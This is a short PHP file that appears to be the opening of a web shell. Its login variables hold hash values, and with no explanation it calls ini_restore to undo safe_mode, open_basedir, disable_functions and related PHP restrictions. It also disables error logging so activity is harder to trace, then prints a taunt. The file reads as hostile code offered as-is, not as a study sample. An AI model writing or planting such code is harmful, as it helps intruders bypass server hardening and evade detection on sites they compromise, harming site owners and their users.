<?php
$language="eng";

$auth = 0;

$name="8cd59f852a590eb0565c98356ecb0b84";
$pass="8cd59f852a590eb0565c98356ecb0b84";

@ini_restore("safe_mode");
@ini_restore("open_basedir");
@ini_restore("safe_mode_include_dir");
@ini_restore("safe_mode_exec_dir");
@ini_restore("disable_functions");
@ini_restore("allow_url_fopen");

@ini_set("error_log",NULL);
@ini_set("log_errors",0);
echo "fuxx";
?>